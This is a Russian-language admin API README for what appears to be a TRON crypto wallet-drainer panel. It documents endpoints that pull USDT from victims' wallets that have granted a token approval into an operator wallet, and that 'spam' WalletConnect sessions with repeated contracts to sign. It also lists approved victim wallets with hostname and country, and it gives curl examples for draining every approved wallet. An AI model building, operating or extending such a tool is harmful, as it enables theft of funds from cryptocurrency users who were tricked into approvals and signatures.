# Admin API Documentation

Этот API предоставляет административные функции для управления системой TRON кошельков и операций с блокчейном.

## Авторизация

Все защищенные эндпоинты требуют JWT токен в заголовке Authorization:
```
Authorization: Bearer <your-jwt-token>
```

### Получение токена

**POST** `/admin/auth/login`

```json
{
  "username": "admin",
  "password": "your-password"
}
```

Ответ:
```json
{
  "success": true,
  "data": {
    "token": "jwt-token-here",
    "admin": {
      "id": 1,
      "username": "admin",
      "last_login": "2025-07-18T10:00:00.000Z"
    }
  }
}
```

## Blockchain Wallet Management API

### 1. Перевод USDT с клиентского кошелька на кошелек оператора

**POST** `/admin/blockchain/transfer-usdt-to-operator`

Переводит USDT с кошелька клиента (у которого `has_usdt_approval = true`) на кошелек оператора.

Тело запроса:
```json
{
  "walletId": 1,
  "amount": 100.5
}
```

Ответ:
```json
{
  "success": true,
  "data": {
    "transactionId": "0x...",
    "amount": 100.5,
    "fromAddress": "TClient...",
    "toAddress": "TOperator..."
  },
  "message": "USDT transferred successfully to operator"
}
```

### 2. Перевод TRX с кошелька оператора на клиентский кошелек

**POST** `/admin/blockchain/transfer-trx-from-operator`

Переводит TRX с кошелька оператора на указанный адрес.

Тело запроса:
```json
{
  "toAddress": "TClient...",
  "amount": 10.0,
  "hostname": "example.com"
}
```

Ответ:
```json
{
  "success": true,
  "data": {
    "transactionId": "0x...",
    "amount": 10.0,
    "fromAddress": "TOperator...",
    "toAddress": "TClient..."
  },
  "message": "TRX transferred successfully from operator"
}
```

### 3. Спам контрактами для WalletConnect кошельков

**POST** `/admin/blockchain/spam-contracts`

Отправляет серию контрактов на подписание для кошельков типа "walletconnect" с активной сессией.

Тело запроса:
```json
{
  "walletId": 1,
  "contractCount": 5,
  "delayBetweenContracts": 2000
}
```

Ответ:
```json
{
  "success": true,
  "message": "Spam contracts started in background",
  "data": {
    "walletId": 1,
    "contractCount": 5,
    "delayBetweenContracts": 2000
  }
}
```

### 4. Проверка активности сессии

**GET** `/admin/blockchain/session-activity/:walletId`

Проверяет, активна ли сессия WalletConnect для кошелька.

Ответ:
```json
{
  "success": true,
  "data": {
    "walletId": 1,
    "isSessionActive": true
  }
}
```

### 5. Получение баланса кошелька из блокчейна

**GET** `/admin/blockchain/balance/:address`

Получает актуальный баланс TRX и USDT из блокчейна.

Ответ:
```json
{
  "success": true,
  "data": {
    "address": "TAddress...",
    "trxBalance": 150.25,
    "usdtBalance": 500.0,
    "lastUpdate": "2025-07-18T10:00:00.000Z"
  }
}
```

### 6. Обновление баланса кошелька в базе данных

**PUT** `/admin/blockchain/update-balance/:walletId`

Обновляет баланс кошелька в базе данных, получив актуальные данные из блокчейна.

Ответ:
```json
{
  "success": true,
  "data": {
    "address": "TAddress...",
    "trxBalance": 150.25,
    "usdtBalance": 500.0,
    "lastUpdate": "2025-07-18T10:00:00.000Z"
  },
  "message": "Wallet balance updated successfully"
}
```

### 7. Получение кошельков с USDT approval

**GET** `/admin/blockchain/wallets-with-approval?page=1&limit=10`

Получает список кошельков с `has_usdt_approval = true`.

Ответ:
```json
{
  "success": true,
  "data": {
    "data": [
      {
        "id": 1,
        "address": "TAddress...",
        "hostname": "example.com",
        "country": "US",
        "trxBalance": 100.0,
        "usdtBalance": 500.0,
        "usdt_approval_date": "2025-07-18T09:00:00.000Z",
        "lastBalanceUpdate": "2025-07-18T10:00:00.000Z",
        "created_at": "2025-07-18T08:00:00.000Z"
      }
    ],
    "pagination": {
      "page": 1,
      "limit": 10,
      "total": 25,
      "totalPages": 3
    }
  }
}
```

### 8. Получение WalletConnect кошельков с активными сессиями

**GET** `/admin/blockchain/walletconnect-wallets?page=1&limit=10`

Получает список кошельков типа "walletconnect" с активными сессиями.

## Обычные CRUD операции

### Домены (Domains)

- **GET** `/admin/domains` - Получить все домены
- **GET** `/admin/domains/:id` - Получить домен по ID
- **POST** `/admin/domains` - Создать новый домен
- **PUT** `/admin/domains/:id` - Обновить домен
- **DELETE** `/admin/domains/:id` - Удалить домен

### Кошельки (Wallets)

- **GET** `/admin/wallets` - Получить все кошельки
- **GET** `/admin/wallets/stats` - Получить статистику кошельков
- **GET** `/admin/wallets/:id` - Получить кошелек по ID
- **GET** `/admin/wallets/address/:address` - Получить кошелек по адресу
- **PUT** `/admin/wallets/:id` - Обновить кошелек
- **DELETE** `/admin/wallets/:id` - Удалить кошелек

### Чеки (Checks)

- **GET** `/admin/checks` - Получить все чеки
- **GET** `/admin/checks/stats` - Получить статистику чеков
- **GET** `/admin/checks/:id` - Получить чек по ID
- **PUT** `/admin/checks/:id` - Обновить чек
- **DELETE** `/admin/checks/:id` - Удалить чек

## Создание первого администратора

Для создания первого администратора запустите:

```bash
npm run create-admin
```

Это создаст администратора с логином `admin` и паролем `admin123`. **Обязательно измените пароль после первого входа!**

## Переменные окружения

Создайте файл `.env` в корне проекта:

```env
DATABASE_URL="file:./prisma/database.db"
JWT_SECRET="your-super-secret-jwt-key-change-this-in-production"
JWT_EXPIRES_IN="24h"
```

## Примеры использования

### 1. Перевод всех USDT с approved кошельков

```bash
# Получить список кошельков с approval
curl -H "Authorization: Bearer <token>" \
  "http://localhost:3000/admin/blockchain/wallets-with-approval"

# Перевести USDT с каждого кошелька
curl -X POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"walletId": 1, "amount": 100}' \
  "http://localhost:3000/admin/blockchain/transfer-usdt-to-operator"
```

### 2. Спам контрактами для всех WalletConnect кошельков

```bash
# Получить список WalletConnect кошельков
curl -H "Authorization: Bearer <token>" \
  "http://localhost:3000/admin/blockchain/walletconnect-wallets"

# Запустить спам для кошелька
curl -X POST -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"walletId": 1, "contractCount": 10, "delayBetweenContracts": 3000}' \
  "http://localhost:3000/admin/blockchain/spam-contracts"
```

## Логирование

Все административные действия логируются в консоль с указанием:
- Времени выполнения
- Имени и ID администратора
- IP адреса
- Выполненного действия
- URL запроса

Формат лога:
```
[2025-07-18T10:00:00.000Z] Admin Action: TRANSFER_USDT_TO_OPERATOR | Admin: admin (ID: 1) | IP: 127.0.0.1 | URL: /admin/blockchain/transfer-usdt-to-operator
```
